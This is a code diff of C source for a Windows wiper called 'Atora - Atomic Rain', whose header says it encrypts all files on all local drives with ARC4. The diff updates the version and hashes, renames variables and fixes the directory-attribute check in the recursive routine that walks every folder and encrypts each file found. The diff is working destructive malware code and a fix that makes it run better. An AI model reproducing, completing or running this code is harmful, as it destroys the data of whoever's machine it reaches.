@@ -1,11 +1,11 @@
 /*
   Name:             Atora - Atomic Rain. Windows version.
-  Version:          5.58/04.06.20
+  Version:          5.60/05.06.20
   Compiler:         TCC ver 0.9.27
   Class:            Files shredder for Windows. Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
-  SHA-2-256:        bdca9380e25090a82dd1c47a560388a54ea69f5da33bfef7369dc5df47674c5b
-  SHA-2-256_UPX:    6c281e02ba297b4474061d6ae4c6419ab5161dec4397287e26533b16f7999420
+  SHA-2-256:        90d9e3fcf78f8ea6b75ea8f2af071be745cecbccbc64f829132a3e28923dbdcc
+  SHA-2-256_UPX:    00e217052ebf8c2d658b426e3d54d1d202a0cd27168edb3523ad36c648c3c50b
 */
 #include <io.h>
 #include <time.h>
@@ -130,31 +130,32 @@ void search_all_files(MEMORY_CTX * ctx, uint8_t * path, uint8_t * mask) {
   WIN32_FIND_DATA wfd;
   HANDLE hfound;
 
-  uint8_t newpath[MAX_PATH];
-  uint8_t fpath[MAX_PATH];
-  uint8_t pathifile[MAX_PATH];
-  uint8_t delpath[MAX_PATH];
+  uint8_t new_path_of_file[MAX_PATH];
+  uint8_t file_of_path[MAX_PATH];
+  uint8_t path_file[MAX_PATH];
+  uint8_t path_for_delete[MAX_PATH];
 
-  strcpy(fpath, path);
-  strcat(fpath, slash);
-  strcpy(delpath, fpath);
-  strcat(fpath, mask);
+  strcpy(file_of_path, path);
+  strcat(file_of_path, slash);
+  strcpy(path_for_delete, file_of_path);
+  strcat(file_of_path, mask);
 
-  if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
+  if ((hfound = FindFirstFile(file_of_path, &wfd)) != INVALID_HANDLE_VALUE) {
     do {
       if ((strcmp(wfd.cFileName, t_two) != 0) && (strcmp(wfd.cFileName, t_one) != 0)) {
-        if (wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
-          strcpy(newpath, path);
-          strcat(newpath, slash);
-          strcat(newpath, wfd.cFileName);
-          search_all_files(ctx, newpath, mask);
-        }
-        else {
-          strcpy(pathifile, delpath);
-          strcat(pathifile, wfd.cFileName);
+        if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
+          strcpy(path_file, path_for_delete);
+          strcat(path_file, wfd.cFileName);
 
           generate_key(ctx);
-          file_encrypt(ctx, pathifile);
+          file_encrypt(ctx, path_file);
+        }
+        else {
+          strcpy(new_path_of_file, path);
+          strcat(new_path_of_file, slash);
+          strcat(new_path_of_file, wfd.cFileName);
+
+          search_all_files(ctx, new_path_of_file, mask);
         }
       }
     } while(FindNextFile(hfound, &wfd) != 0);
